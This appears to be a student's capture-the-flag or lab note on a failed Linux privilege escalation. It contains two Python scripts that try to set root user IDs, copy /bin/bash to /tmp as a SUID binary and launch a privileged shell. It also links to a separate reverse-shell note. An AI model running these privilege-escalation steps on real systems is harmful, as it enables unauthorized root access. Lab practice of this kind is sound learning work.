
Does not work! Was trying to do the same as the elf
```python
#!/usr/bin/env python3

import os
os.setresuid(0,0,0)
os.system("touch /tmp/testfile")
os.system("cp /bin/bash /tmp/sofia")
os.system("chmod +xs /tmp/sofia")
```

trying to find more on the error, failed
```python
!/usr/bin/env python3

import os
import subprocess

def main():
    try:
        print("Setting user IDs to root...")
        os.setresuid(0, 0, 0)

        # Execute commands
        print("Running commands...")
        os.system("touch /tmp/testfile2")
        os.system("cp /bin/bash /tmp/sofia")
        os.system("chmod +xs /tmp/sofia")
        os.system("/bin/bash -p")
    except PermissionError as e:
        print(f"Permission denied: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

```

Both files where created but with karen, the user, as the owner. The chmod worked fine. But without root as the owner it's useless

also check out [[../04 - Shells/python reverse shell|python reverse shell]]